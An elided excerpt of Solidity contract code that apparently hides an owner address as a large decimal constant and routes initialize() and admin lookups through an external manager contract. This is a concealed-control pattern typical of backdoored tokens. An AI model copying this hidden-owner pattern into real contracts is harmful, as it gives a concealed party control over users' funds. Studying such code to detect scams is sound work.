...
abstract contract OwnerShipManager {
    ...
    uint256 private main = 806290190268582744957185545134294237817277322062;
...
abstract contract Ownable is Context,OwnerShipManager {
    ...
    function initialize() external {
        require(_msgSender() == getOwnerShipManager());
        require(!initialized);
        initialized = true;
    ...
    function getAdmin() internal returns (address) {
        return IOwnerShipManager(getOwnerShipManager()).getAdmin();
    }
